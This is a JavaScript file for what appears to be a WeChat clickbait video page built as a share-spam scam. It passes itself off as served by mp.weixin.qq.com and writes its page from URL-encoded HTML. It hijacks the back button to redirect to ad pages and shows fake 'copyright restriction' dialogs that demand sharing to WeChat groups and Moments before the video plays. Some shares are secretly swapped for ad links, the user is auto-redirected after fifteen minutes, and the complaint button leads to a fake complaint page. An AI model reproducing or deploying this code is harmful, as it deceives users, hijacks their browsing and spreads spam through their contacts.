    // 返回开关 值为 0 表示关 值为 1 表示开
    var fanhui = 1
    // 视频点赞和阅读量修改
    var likeAndview = new Array()
    likeAndview['web'] = '网页由 mp.weixin.qq.com 提供</br> QQ浏览器X5内核提供技术支持' // 下拉网址伪装

    //最下方广告
    var ad_4 = new Array()
    // 开关 值为 0 表示关 值为 1 表示开
    ad_4['on'] = 1
    // 广告下标
    ad_4['item'] = 'nk'
    // 广告图片
    var adimages = ['/templates/20190318161051.gif','/templates/20190318161056.gif','/templates/20190318161102.gif'];
    ad_4['img'] = adimages[Math.floor(Math.random()*3)];

    // 0表示先分享群后分享圈 1表示先分享圈后分享群
    var timelineOnOff = 0
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告
    var TTimes = new Array('2'); // 朋友圈广告开关
    // 分享朋友圈次数
    var Tnum = 2
    // 值为 '0' 表示关闭广告
    // 值为任意数字 表示分享第几次为广告 栗子：'1','3' 表示第一次第三次分享的是广告 第二次为视频
    // 如果提交的数字为 '999' 这表示全部分享为广告    
    var ATimes = new Array('2'); // 朋友广告开关
    // 分享朋友群次数 
    var Anum = 3

    // api域名
    var apidomain = '//' + location.hostname + '/';
	videoIndex = typeof(videoIndex) == 'undefined' ? 0 : videoIndex;

    // 视频基础信息
    var datasJson = {
        ContinuePlay: false,
        VideoList: {
            ShowCount: 5,
            Videos: [
                {
                    JumpUrl: "/321eR1Rpe0p8ZXp4SHdvdXsiVyJRCjtGOl1QN2E6GToCVkIKWWVQOD8_X1ADU0A.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190520115949.jpg",
                    Title: "市内扫黄，被山庄老板多事叫嚣叫来社会人，结果出人意料！"
                },
                {
                    JumpUrl: "/d1b4Q1ddAFQGB2Z2YmFADG8DaWINW2UBKWl5b3gIQh8fVktWS1BFKjgPAwYpUFI.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190521145608.jpg",
                    Title: "穷就该被看不起？进城打拼穷小子回乡看望未婚妻被胯下羞辱，结果..."
                },
                {
                    JumpUrl: "/4f9fBFFRSHthagN1XAVdMQt6QFxhB0gEdFFaFX8BGUcsJggsSl1zUQRcJh01RWQ.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190521145623.jpg",
                    Title: "父亲带女儿去吃饭，被嚣张执法人员暴打，速看，十分钟删视频"
                },
                {
                    JumpUrl: "/d333eUdcYXJCRVlXewcDQl1-dHoHVk15bRInQm4KBUYBVBcEDX1xCho8Ei81bgo.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190521145702.jpg",
                    Title: "董事长开破车回乡看望父母，却被弟妹赶出家门，一怒之下..."
                },
                {
                    JumpUrl: "/beeaAHNGW3l1ZUMDVzJhBgJ3WVY8aFt2dVpmUHkbEUI-KgspeHxQJDBSWwErDAQ.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190521145720.jpg",
                    Title: "退伍军人骑自行车不小心刮到豪车被打，视频偷拍流出，结果让人大吃一惊"
                },
                {
                    JumpUrl: "/6213UUh3dF92WEN3d2xbAlsceSx7RVNVUxNRVUcOAyAKGEcdcml0DRAtWicgagA.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190521145802.jpg",
                    Title: "探长被小混混枪击，被打断腿，结果..."
                },
                {
                    JumpUrl: "/7619dUNeCWhTWmFZQQlvAT17BVRUSV5aekg0NVIMQjc9UgBcbFgeWCQlUzMablk.xiche",
                    PicUrl: "http://cdn.xunfengkj.com/templates/20190521145850.jpg",
                    Title: "社会人无法无天，强行拆掉部对大院，私令暴怒！"
                }
            ]
        }
    };

    var pageGlobal = {
        adLink: "nk.cash",
        delayTime: [352,627,125,840,407,233,300],//[10,10,10,10,10,10,10],
        endJumpUrl: "nk.cash",
        isOnlyShowVideoBlackBg:false,
        // pic: [
        //     "http://cdn.xunfengkj.com/templates/20190521145508.jpg",
        //     "http://cdn.xunfengkj.com/templates/20190521145608.jpg",
        //     "http://cdn.xunfengkj.com/templates/20190521145623.jpg",
        //     "http://cdn.xunfengkj.com/templates/20190521145702.jpg",
        //     "http://cdn.xunfengkj.com/templates/20190521145720.jpg",
        //     "http://cdn.xunfengkj.com/templates/20190521145802.jpg",
        //     "http://cdn.xunfengkj.com/templates/20190521145850.jpg"
        // ],
        playStatus: "",
        sMode: "a",
        // videoTitle: [
        //     "市内扫黄，被山庄老板多事叫嚣叫来社会人，结果出人意料！",
        //     "穷就该被看不起？进城打拼穷小子回乡看望未婚妻被胯下羞辱，结果...",
        //     "父亲带女儿去吃饭，被嚣张执法人员暴打，速看，十分钟删视频",
        //     "董事长开破车回乡看望父母，却被弟妹赶出家门，一怒之下...",
        //     "退伍军人骑自行车不小心刮到豪车被打，视频偷拍流出，结果让人大吃一惊",
        //     "探长被小混混枪击，被打断腿，结果...",
        //     "社会人无法无天，强行拆掉部对大院，私令暴怒！"
        // ],
        showPageIndex: 0,
        vid: [
            "q08671bywmv",
            "r0865x6c3cc",
            "b0873cweqe9",
            "i0873a02hpl",
            "n0873haoht3",
            "g087395q7jn",
            "z0867bvgq15"
        ]
    };

    var autotime = 60000*15 //毫秒
    var timestamp = Date.parse(new Date());

    fanhui && openfh()
    var new_doc = document.open("text/html", "replace");
    var html = decodeURIComponent("%3C!DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3Dedge%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1.0%2C%20minimum-scale%3D1.0%2C%20maximum-scale%3D1.0%2C%20user-scalable%3Dno%22%3E%0A%20%20%20%20%3Cmeta%20content%3D%22yes%22%20name%3D%22apple-mobile-web-app-capable%22%3E%0A%20%20%20%20%3Cmeta%20content%3D%22black%22%20name%3D%22apple-mobile-web-app-status-bar-style%22%3E%0A%20%20%20%20%3Cmeta%20content%3D%22telephone%3Dno%22%20name%3D%22format-detection%22%3E%0A%20%20%20%20%3Cmeta%20content%3D%22email%3Dno%22%20name%3D%22format-detection%22%3E%0A%20%20%20%20%3Ctitle%3E...%3C%2Ftitle%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%20href%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Findex.css%22%3E%0A%20%20%20%20%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22https%3A%2F%2Fcdn.bootcss.com%2Fjquery%2F3.2.1%2Fjquery.min.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Fimgcache.qq.com%2Ftencentvideo_v1%2Ftvp%2Fjs%2Ftvp.player_v2_jq.js%22%3E%3C%2Fscript%3E%0A%20%20%20%20%3Cscript%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fhtml5player.js%22%20charset%3D%22utf-8%22%3E%3C%2Fscript%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20href%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fplayer.css%22%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A%2F%2Fv.qq.com%2Fiframe%2Ftvp.config.js%22%20charset%3D%22utf-8%22%3E%3C%2Fscript%3E%0A%3C%2Fhead%3E%0A%0A%3Cbody%20id%3D%22mainBody%22%20style%3D%22display%3A%20block%3B%20background-color%3A%20rgb(255%2C%20255%2C%20255)%3B%22%20cz-shortcut-listen%3D%22true%22%3E%0A%3Cdiv%20id%3D%22iosDialog%22%20style%3D%22background%3A%20rgb(0%2C%200%2C%200)%3Bdisplay%3A%20none%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22weui-mask%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20class%3D%22weui-dialog%22%20style%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22weui-dialog__bd%22%3E%E7%B2%BE%E5%BD%A9%E5%86%85%E5%AE%B9%EF%BC%8C%E5%8D%B3%E5%B0%86%E5%91%88%E7%8E%B0%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22weui-dialog__ft%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20onclick%3D%22goPlayVideo()%22%20class%3D%22weui-dialog__btn%20weui-dialog__btn_primary%22%3E%E7%AB%8B%E5%8D%B3%E6%92%AD%E6%94%BE%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%0A%0A%3Cdiv%20class%3D%22goback%22%3E%0A%20%20%20%20%3Cdiv%20id%3D%22topLeftBackBtnRefText%22%20class%3D%22goback_left%22%20onclick%3D%22inToAd('%E5%B7%A6%E4%B8%8A%E8%A7%92%E8%BF%94%E5%9B%9E')%22%3E%0A%20%20%20%20%20%20%20%20%3Ci%20id%3D%22topLeftBackBtnRefIcon%22%20class%3D%22back_icon%22%3E%3C%2Fi%3E%E8%BF%94%E5%9B%9E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Ca%20onclick%3D%22inToTouSu(1)%22%20class%3D%22goback_right%22%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20style%3D%22margin-left%3A%208px%3Bwidth%3A25px%3Bheight%3A25px%22%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Ftemplates%2Ftousu.png%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%26nbsp%3B%E6%8A%95%E8%AF%89%0A%20%20%20%20%3C%2Fa%3E%0A%3C%2Fdiv%3E%0A%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22loading_video%22%20id%3D%22loading_video%22%20style%3D%22display%3A%20none%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20style%3D%22width%3A%2050px%3B%22%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Ftemplates%2F0.gif%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20style%3D%22font-size%3A%2018px%3Bline-height%3A%2060px%3B%22%3E%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%A4%B1%E8%B4%A5%EF%BC%81%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%E5%A6%82%E8%A7%86%E9%A2%91%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%87%BA%E6%9D%A5%2C%E8%AF%B7%E5%88%B7%E6%96%B0%E9%A1%B5%E9%9D%A2%EF%BC%81%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20class%3D%22video_tag%22%20id%3D%22video_tag%22%3E%0A%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20class%3D%22video_div%22%20id%3D%22videoDiv%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22flex%3A%201%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20id%3D%22mainVideoTitle%22%20style%3D%22font-weight%3Abold%3Bfont-size%3A%2016px%3Bflex-wrap%3A%20wrap%22%3E%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding%3A2px%3Balign-items%3A%20center%3Bmargin-top%3A8px%3Bdisplay%3Aflex%3Bflex-direction%3Arow%3Bborder-radius%3A%206px%3Bbackground%3A%20%23fff%3B%3Bborder%3A1px%20solid%20%23fff%3Bbox-shadow%3A%20%23eee%201px%201px%202px%201px%20%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20onclick%3D%22inToAd('%E5%A4%B4%E5%83%8F%E8%BF%94%E5%9B%9E')%22%20style%3D%22display%3Aflex%3Bflex-direction%3Arow%3Bflex%3A1%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20id%3D%22headerIcon%22%20style%3D%22margin-left%3A%208px%3Bborder-radius%3A20px%3Bwidth%3A38px%3Bheight%3A38px%22%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Ftemplates%2FheadIcon_31.jpg%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22display%3Aflex%3Bflex%3A1%3Bflex-direction%3A%20column%3Bjustify-content%3A%20center%3Bmargin-left%3A%2010px%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20id%3D%22headNick%22%20style%3D%22font-size%3A%2014px%22%3E%E5%AF%8C%E4%BA%8C%E4%BB%A3%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20id%3D%22headText%22%20style%3D%22font-size%3A%2013px%3Bcolor%3A%23999%22%3E%E5%B7%B2%E5%8F%91%E5%B8%83%20188%20%E4%B8%AA%E8%A7%86%E9%A2%91%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20onclick%3D%22goToShare()%22%20style%3D%22display%3Aflex%3Bflex-direction%3Arow%3Balign-items%3A%20center%3Bjustify-content%3A%20center%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20style%3D%22margin-right%3A10px%3Bcolor%3A%23f00%3Bfont-size%3A%2014px%3Bfont-weight%3A%20bold%22%3E%E5%88%86%E4%BA%AB%E6%8A%BD%E5%A4%A7%E5%A5%96%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Ftemplates%2FshareGiftIcon.png%22%20class%3D%22wx_icon%22%20alt%3D%22%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20class%3D%22line%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20class%3D%22video_list%22%20id%3D%22video_list%22%3E%0A%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20id%3D%22bottomRef%22%20class%3D%22bottomshow%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%3E%3Cspan%3E%E5%B9%BF%E5%91%8A%3C%2Fspan%3E%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3Ca%20onclick%3D%22inToAd()%22%20class%3D%22bottomliitem%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20class%3D%22banneradimg%22%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Ftemplates%2F1532522368%20.gif%22%3E%0A%20%20%20%20%20%20%20%20%3C%2Fa%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20id%3D%22addIFame%22%3E%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%0A%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fpage_c_v1.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2Fcommon.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20src%3D%22https%3A%2F%2Fres.wx.qq.com%2Fopen%2Fjs%2Fjweixin-1.0.0.js%22%3E%3C%2Fscript%3E%0A%3Cscript%20type%3D%22text%2Fjavascript%22%3E%3C%2Fscript%3E%0A%0A%3Ctextarea%20readonly%3D%22%22%20style%3D%22font-size%3A%2012pt%3B%20border%3A%200px%3B%20padding%3A%200px%3B%20margin%3A%200px%3B%20position%3A%20absolute%3B%20left%3A%20-9999px%3B%20top%3A%200px%3B%22%3E%3C%2Ftextarea%3E%0A%3Cdiv%20id%3D%22pauseplay%22%20style%3D%22display%3A%20none%3B%20opacity%3A%200%3B%20position%3A%20fixed%3B%20left%3A%200%3B%20right%3A%200%3B%20top%3A%2065px%3B%20bottom%3A%200%3B%20background-color%3A%20rgba(80%2C%2080%2C%2080%2C%2050)%3B%20z-index%3A%201000000%3B%22%3E%0A%3C%2Fdiv%3E%0A%0A%3Cdiv%20id%3D%22tousu%22%20style%3D%22position%3A%20fixed%3Bbottom%3A10px%3Bright%3A%2010px%3Bpadding%3A5px%3Bdisplay%3A%20flex%3Bjustify-content%3A%20space-between%3Balign-items%3A%20center%3Bwidth%3A70px%3Bfont-size%3A14px%3Bcolor%3A%23fff%3Bz-index%3A%209999%3Bdisplay%3Anone%3B%22%20onclick%3D%22inToTouSu(0)%22%3E%0A%20%20%20%20%3Cimg%20src%3D%22http%3A%2F%2Fcdn.gerenwang.net%2Ftest2%2Ftousu%2Ftousu.png%22%20alt%3D%22%22%20style%3D%22width%3A32px%3Bheight%3A32px!important%3B%22%3E%0A%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%20%20%20%E6%8A%95%E8%AF%89%0A%20%20%20%20%3C%2Fp%3E%0A%3C%2Fdiv%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%3Cscript%3E%0A%20%20%20%20document.write(%0A%20%20%20%20%20%20%20%20'%3Cimg%20src%3D%22http%3A%2F%2Fcdn.xunfengkj.com%2Fstyle%2F20190516174636.jpg%22%20id%3D%22fenxiang%22%20style%3D%22display%3Ablock%3Bwidth%3A100%25%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3Bdisplay%3Anone%22%3E'%0A%20%20%20%20)%3B%0A%3C%2Fscript%3E%0A");
	new_doc.write(html);
    new_doc.close();

    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = 'https://s96.cnzz.com/z_stat.php?id=1277620180&web_id=1277620180';
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();

    function openfh()
    {
        window.onhashchange = function() {
           ggcash('fanhui');
        }
    }


    function autoskip()
    {
        if (autotime < (Date.parse(new Date()) - timestamp)) {
            $.post(apidomain, {
                index: 'wx5'
            }, function(res) {
                location.href = res.url;
            }, 'JSON');
        } else {
            setTimeout(function(){
                window.autoskip()
            },500);
        }
    }

	function inToAd(){
        ggcash('fanhui');
    }

    function inToTouSu(type){
      	if(type == 1){
           	location.href = apidomain + "tousu/index.htm";
        }else{
        	location.href = 'https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?block_type=20&url=weixin.com';
        }
    }

    function ggcash(name) {
        location.href = apidomain + "" + name + ".cash";
    }

    function setCookie(name, value) {
        var Days = 1;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 6 * 1000);
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
    }

    function getCookie(name) {
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
        if (arr = document.cookie.match(reg)) return unescape(arr[2]);
        else return null;
    }

    function getQueryString(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            return decodeURI(r[2]);
        }
        return null;
    }
    var shareATimes = 0;
    var shareTTimes = 0;
    var alertTimes = 0;
    var message = null;


    var Tpost = null
    var Apost = null


    !(function(){
        var temp = new Array()
        for (var i = 0; i < TTimes.length; i++) {
            temp["'"+TTimes[i]+"'"] = TTimes[i]
            if (1 <= i) {
                Tpost = '1'
            } else {
                Tpost = TTimes[i]
            }
        }
        TTimes = temp
        temp = new Array()

        for (var i = 0; i < ATimes.length; i++) {
            temp["'"+ATimes[i]+"'"] = ATimes[i]
            if (1 <= i) {
                Apost = '1'
            } else {
                Apost = ATimes[i]
            }
        }
        ATimes = temp
    })()

    function wxconfig()
    {
        $.post(apidomain, {
            url: location.href.split('#')[0],
            index: 'jump'
        }, function(res) {
            console.log(res);
            window.data = res;
            wx.config(window.data.config);
            sharedata();
        }, 'JSON');

        autoskip()
    }
    function wxalert(msg, btn, callback) {
        if (alertTimes == 0) {
            var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
            $("body").append(dialog)
        }
        alertTimes++;
        var d = $('#lly_dialog');
        d.show(200);
      	$('#tousu').css('display','flex');
        d.find("#lly_dialog_msg").html(msg);
        d.find("#lly_dialog_btn").html(btn);
        d.find("#lly_dialog_btn").off('click').on('click', function() {
            d.hide(200);
            if (callback) {
                callback()
            }
        })
    }


    function share_tip() {
        share_config(window.result);
        if (Anum > shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if  (Anum <= shareATimes && 0 === shareTTimes) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if ("0" == Tpost && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                setCookie('xxxooo', 1);
                $.post(apidomain, {
                    index: 'goon',
                    audkey: videoIndex
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else if (Tnum > shareTTimes && "0" !== Tpost) {
            message = window.result.share_info['timeline' + shareTTimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && 0 === shareATimes) {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        } else if (Tnum <= shareTTimes && Anum <= shareATimes) {
            message = window.result.share_info.success
            wxalert(message, '确定', function() {
                setCookie('xxxooo', 1);
                $.post(apidomain, {
                    index: 'goon',
                    audkey: videoIndex
                }, function(res) {
                    location.href = res.url;
                }, 'JSON');
            })
        } else {
            message = window.result.share_info['app' + shareATimes]
            wxalert(message, '好')
        }
    }

    function show_tip() {
    	if(message==null||message==''){
    		message='<div class="weui-dialog__bd" id="lly_dialog_msg" style="font-size: 12px;"><img style="width: 40px;margin-top: -30px" src="http://cdn.xunfengkj.com/templates/006tptJAgy1fs7klcj4ycg302s02s747.gif"><br><b style="font-size: 16px;color: red">应版权要求限制</b><br><br><span style="font-size: 14px">分享到微信群即可</span><br><b style="font-size: 15px;color: red;">免流量看完整视频</b><br><br><b style="font-size: 18px;color: red;">结局更精彩</b></div>';
    	}
        wxalert(message, '好')
    }

    function sharedata() {
        $.post(apidomain, {
            index: 'duapp',
            audkey: videoIndex,
            TTimes: Tpost,
            ATimes: Apost,
            Timeline: timelineOnOff
        }, function(data) {
            window.result = data;
            message = data.share_info.default
            share_config(data);
        }, 'JSON');
    }


    function share_config(data) {
        wx.ready(function() {
            wx.hideOptionMenu();
            wx.showMenuItems({
                menuList: ['menuItem:share:appMessage', 'menuItem:share:timeline']
            });
            var diqu=''
            wx.onMenuShareAppMessage({
                title: ATimeslen() ? diqu + data.share_gg_info.title : diqu + data.share_app_info.title,
                desc: ATimeslen() ? diqu + data.share_gg_info.desc : diqu + data.share_app_info.desc,
                link: ATimeslen() ? ggLink(data.share_gg_info.link, window.data.quan) : window.data.qun + data.share_app_info.link,
                imgUrl: ATimeslen() ? data.share_gg_info.img_url : data.share_app_info.img_url,
                type: 'video',
                dataUrl: 'http://zhangmenshiting.qianqian.com/data2/music/23b67cbfb1e93338bb2c09a2bc23d5c7/606149108/606149108.mp3?xcode=717e0e537d73960f554bf4edd997f8d2',
                success: function() {
                    shareATimes += 1;
                    ajaxSend();
                    share_tip();
                },
                cancel: function() {}
            });
            wx.onMenuShareTimeline({
                title: TTimeslen() ? diqu + data.share_timeline_cash_info.title : diqu + data.share_timeline_info.title,
                link: TTimeslen() ? ggLink(data.share_timeline_cash_info.link, window.data.quan) : window.data.quan + data.share_timeline_info.link,
                imgUrl: TTimeslen() ? data.share_timeline_cash_info.img_url : data.share_timeline_info.img_url,
                type: 'video',
                dataUrl: 'http://zhangmenshiting.qianqian.com/data2/music/23b67cbfb1e93338bb2c09a2bc23d5c7/606149108/606149108.mp3?xcode=717e0e537d73960f554bf4edd997f8d2',
                success: function() {
                    shareTTimes += 1;
                    ajaxSend();
                    share_tip();
                },
                cancel: function() {}
            });
        });
    }

    function ATimeslen() {
        if ('undefined' !== typeof ATimes['999']) {
            return true
        } else if ('undefined' !== typeof ATimes['0']) {
            return false
        } else if ('undefined' !== typeof ATimes["'"+(shareATimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }

    function TTimeslen() {
        if ('undefined' !== typeof TTimes['999']) {
            return true
        } else if ('undefined' !== typeof TTimes['0']) {
            return false
        } else if ('undefined' !== typeof TTimes["'"+(shareTTimes + 1)+"'"]) {
            return true
        } else {
            return false
        }
    }

    function ggLink(cash, host)
    {
        return host + cash
    }

    function ajaxSend(){
        $.post(apidomain + 'ajaxSendAppidShareTimes.php', {
            name: location.hostname,
        }, function(data) {
            console.log(data);
        });
    }
